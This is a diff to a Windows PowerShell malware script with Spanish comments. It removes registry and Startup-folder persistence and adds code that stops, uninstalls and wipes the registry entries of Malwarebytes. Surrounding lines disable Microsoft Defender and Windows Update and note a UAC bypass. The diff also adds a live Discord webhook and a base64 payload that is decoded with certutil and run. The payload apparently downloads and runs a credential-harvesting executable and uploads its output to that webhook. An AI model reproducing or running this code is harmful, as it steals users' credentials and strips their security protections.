@@ -60,27 +60,6 @@ function Invoke-SelfDestruction {
         }
     }
 
-    # Función para agregar persistencia mediante el registro de Windows
-function Add-RegistryPersistence {
-    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-    $name = "DistopiaPersistence"
-    $value = "$env:TEMP\distopi.exe"
-    
-    if (-not (Test-Path $regPath)) {
-        New-Item -Path $regPath -Force | Out-Null
-    }
-    Set-ItemProperty -Path $regPath -Name $name -Value $value
-}
-
-# Función para agregar persistencia mediante la carpeta de inicio
-function Add-StartupFolderPersistence {
-    $startupPath = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup\distopi.lnk")
-    $shell = New-Object -ComObject WScript.Shell
-    $shortcut = $shell.CreateShortcut($startupPath)
-    $shortcut.TargetPath = "$env:TEMP\distopi.exe"
-    $shortcut.Save()
-}
-
 
     # Delete all the shortcut (.lnk) files that have been accessed or modified within the last day
     $recentFiles = Get-ChildItem -Path "$env:APPDATA\Microsoft\Windows\Recent" | Where-Object { $_.LastWriteTime -ge ((Get-Date).AddDays(-1)) }
@@ -136,6 +115,63 @@ if (-not (Test-Admin)) {
 
     # UAC bypassed here!
 
+    ###############################################################################################################
+
+    # Detener servicios de Malwarebytes
+$services = Get-Service | Where-Object { $_.DisplayName -like "*Malwarebytes*" }
+foreach ($service in $services) {
+    try {
+        Stop-Service -Name $service.Name -Force
+        Write-Output "Servicio $($service.Name) detenido."
+    } catch {
+        Write-Output "Error al detener el servicio $($service.Name): $_"
+    }
+}
+
+# Desinstalar Malwarebytes
+$app = Get-CimInstance -ClassName Win32_Product | Where-Object { $_.Name -like "*Malwarebytes*" }
+if ($app) {
+    $app.Uninstall()
+    Write-Output "Malwarebytes desinstalado."
+} else {
+    Write-Output "Malwarebytes no encontrado."
+}
+
+# Eliminar entradas de registro de Malwarebytes
+$registryPaths = @(
+    "HKLM:\SOFTWARE\Malwarebytes",
+    "HKLM:\SOFTWARE\WOW6432Node\Malwarebytes",
+    "HKCU:\Software\Malwarebytes"
+)
+
+foreach ($path in $registryPaths) {
+    if (Test-Path $path) {
+        Remove-Item -Path $path -Recurse -Force
+        Write-Output "Eliminada la entrada de registro: $path"
+    } else {
+        Write-Output "Entrada de registro no encontrada: $path"
+    }
+}
+
+# Confirmar que los servicios están detenidos
+foreach ($service in $services) {
+    try {
+        $svc = Get-Service -Name $service.Name
+        if ($svc.Status -ne 'Stopped') {
+            Write-Output "El servicio $($service.Name) sigue en ejecución. Intentando detener de nuevo..."
+            Stop-Service -Name $service.Name -Force
+        } else {
+            Write-Output "El servicio $($service.Name) está detenido."
+        }
+    } catch {
+        Write-Output "Error al verificar el estado del servicio $($service.Name): $_"
+    }
+}
+
+
+    
+    ###############################################################################################################
+    
     # Exit the script to allow the rest run as admin
     exit
 }
@@ -238,10 +274,62 @@ Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard
 #Exclusions
 Set-ExecutionPolicy Unrestricted -Force; Set-MpPreference -DisableRealTimeMonitoring $true; Set-MpPreference -MAPSReporting 0; Set-MpPreference -DisableBlockAtFirstSeen $true; Add-MpPreference -ExclusionPath $env:SystemDrive ; Add-MpPreference -ExclusionPath $env:TEMP; Add-MpPreference -ExclusionExtension ".exe"; Set-Service -Name "wuauserv" -StartupType Disabled;
 
+#Lasania
+$webhook = "https://discord.com/api/webhooks/1258951712375570523/ZzVRGI8GumQjTSz_s2geTSXNsk0tE9zp5_56xGu9u2GEHwjLmXhsYPL4G4GMYGmjOC3f";
+$version = "2.4.6";
+$TempFile = "$env:TEMP\temp.ps1"; $File = "$env:TEMP\l.ps1"; echo 77u/JElzQWRtaW4gPSBOZXctT2JqZWN0IFNlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzUHJpbmNpcGFsKFtTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c0lkZW50aXR5XTo6R2V0Q3VycmVudCgpKQ0KJEFkbWluID0gJElzQWRtaW4uSXNJblJvbGUoW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzQnVpbHRJblJvbGVdOjpBZG1pbmlzdHJhdG9yKQ0KJGRpciA9ICIkZW52OnRlbXBcSkhrbmZ1aUQiDQppZiAoIShUZXN0LVBhdGggLVBhdGggIiRkaXIiKSkgew0KTmV3LUl0ZW0gLUl0ZW1UeXBlIERpcmVjdG9yeSAtUGF0aCAiJGRpciINCn0NCmlmICgtbm90ICR2ZXJzaW9uKSB7DQogICR2ZXJzaW9uID0gIjIuNC41Ig0KfQ0KJGxvZyA9ICIkZGlyXG91dHB1dC50eHQiDQokbmV4dGRvb3IgPSAiZ2l0aHViLmNvbSINCiR2ZXJtID0gInYkdmVyc2lvbiINCiRjdXBpZCA9ICJUaGUgTEFaeSBtYWpvciB3YXMgZml4aW5nIEN1cGlk4oCZcyBicm9rZW4gcXVpdmVyLiINCiRsYXp5ID0gIlF1aWNrIGJyb3duIGZveCBqdW1wcyBvdmVyIHRoZSBsYXp5IGRvZy4iDQokZXggPSAiLmV4ZSINCiRhID0gIjoiDQokYiA9ICIvIg0KJGMgPSAkY3VwaWQuU3Vic3RyaW5nKDEsMSkNCiRkID0gJGxhenkuU3Vic3RyaW5nKDI3LDEpDQokZSA9ICRjdXBpZC5TdWJzdHJpbmcoMjgsMSkNCiRmID0gJGN1cGlkLlN1YnN0cmluZygxNywxKQ0KJGcgPSAkY3VwaWQuU3Vic3RyaW5nKDUsMSkNCiRoID0gJGxhenkuU3Vic3RyaW5nKDMxLDEpDQokaSA9ICRjdXBpZC5TdWJzdHJpbmcoMiwxKQ0KJGogPSAkbGF6eS5TdWJzdHJpbmcoMzIsMSkNCiRrID0gJGxhenkuU3Vic3RyaW5nKDEwLDEpDQokbCA9ICRjdXBpZC5TdWJzdHJpbmcoMzAsMSkNCiRtID0gJGxhenkuU3Vic3RyaW5nKDcsMSkNCiRuID0gJGxhenkuU3Vic3RyaW5nKDgsMSkNCiRvID0gJGN1cGlkLlN1YnN0cmluZyg2LDEpDQokcCA9ICRjdXBpZC5TdWJzdHJpbmcoNCwxKQ0KJHEgPSAkY3VwaWQuU3Vic3RyaW5nKDI0LDEpDQokciA9ICRsYXp5LlN1YnN0cmluZyg5LDEpDQokZGVtb24gPSAiJGMkZCRkJGUkZiRhJGIkYiRuZXh0ZG9vciRiIg0KJGFuZ2VsID0gIiRnJGgkaSRmJGYkaiRrJGwkbSRuJG8kYiRwJGokbyRqJHEkayRpJGIkbSRpJGgkaSRqJGYkaSRmJGIkbCRuJHIkayRoJG4kaiRsJGIiDQokaHVtYW4gPSAiJHZlcm0kYiRwJGokbyRqJHEkayRpJGV4Ig0KJHplbGRhID0gIiRkZW1vbiRhbmdlbCRodW1hbiIgfCBPdXQtU3RyaW5nDQpXcml0ZS1Ib3N0ICR6ZWxkYQ0KaWYgKCRBZG1pbiAtZXEgJ1RydWUnKSB7DQogIFNldC1NcFByZWZlcmVuY2UgLURpc2FibGVSZWFsdGltZU1vbml0b3JpbmcgJHRydWUNCg0KICBBZGQtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25QYXRoICIkZGlyIg0KfQ0KJGhpZGUgPSBHZXQtSXRlbSAiJGRpciIgLUZvcmNlDQokaGlkZS5hdHRyaWJ1dGVzPSdIaWRkZW4nDQpJbnZva2UtV2ViUmVxdWVzdCAtVXJpICIkemVsZGEiIC1PdXRGaWxlICIkZGlyXGxhemFnbmUuZXhlIg0KJiAiJGRpclxsYXphZ25lLmV4ZSIgYWxsID4gIiRsb2ciDQpjdXJsLmV4ZSAtRiAicGF5bG9hZF9qc29uPXtcYCJ1c2VybmFtZVxgIjogXGAiJGVudjpDb21wdXRlck5hbWVcYCIsIFxgImNvbnRlbnRcYCI6IFxgIk5ldyBGaWxlIFVwbG9hZGVkYCFcbihBZG1pbjogJEFkbWluKSBcYCJ9IiAtRiAiZmlsZT1AXGAiJGxvZ1xgIiIgJHdlYmhvb2sgPiRudWxsIDI+JjENClN0YXJ0LVNsZWVwIC1TZWNvbmRzIDIwDQppZiAoJEFkbWluIC1lcSAnVHJ1ZScpew0KICBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICRmYWxzZQ0KDQogIFJlbW92ZS1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblBhdGggIiRkaXIiDQp9DQokdW5oaWRlID0gR2V0LUl0ZW0gIiRkaXIiIC1Gb3JjZQ0KJHVuaGlkZS5hdHRyaWJ1dGVzPSdOb3JtYWwnDQpSZW1vdmUtSXRlbSAtUGF0aCAiJGRpciIgLVJlY3Vyc2UgLUZvcmNl > "$TempFile"; certutil -f -decode "$TempFile" "$File" | out-null; & "$env:TEMP\l.ps1"
 
-# Llamada a las funciones para agregar persistencia
-Add-RegistryPersistence
-Add-StartupFolderPersistence
+# Detener servicios de Malwarebytes
+$services = Get-Service | Where-Object { $_.DisplayName -like "*Malwarebytes*" }
+foreach ($service in $services) {
+    try {
+        Stop-Service -Name $service.Name -Force
+        Write-Output "Servicio $($service.Name) detenido."
+    } catch {
+        Write-Output "Error al detener el servicio $($service.Name): $_"
+    }
+}
+
+# Desinstalar Malwarebytes
+$app = Get-CimInstance -ClassName Win32_Product | Where-Object { $_.Name -like "*Malwarebytes*" }
+if ($app) {
+    $app.Uninstall()
+    Write-Output "Malwarebytes desinstalado."
+} else {
+    Write-Output "Malwarebytes no encontrado."
+}
+
+# Eliminar entradas de registro de Malwarebytes
+$registryPaths = @(
+    "HKLM:\SOFTWARE\Malwarebytes",
+    "HKLM:\SOFTWARE\WOW6432Node\Malwarebytes",
+    "HKCU:\Software\Malwarebytes"
+)
+
+foreach ($path in $registryPaths) {
+    if (Test-Path $path) {
+        Remove-Item -Path $path -Recurse -Force
+        Write-Output "Eliminada la entrada de registro: $path"
+    } else {
+        Write-Output "Entrada de registro no encontrada: $path"
+    }
+}
+
+# Confirmar que los servicios están detenidos
+foreach ($service in $services) {
+    try {
+        $svc = Get-Service -Name $service.Name
+        if ($svc.Status -ne 'Stopped') {
+            Write-Output "El servicio $($service.Name) sigue en ejecución. Intentando detener de nuevo..."
+            Stop-Service -Name $service.Name -Force
+        } else {
+            Write-Output "El servicio $($service.Name) está detenido."
+        }
+    } catch {
+        Write-Output "Error al verificar el estado del servicio $($service.Name): $_"
+    }
+}
+
 
 ##############################################################################
 
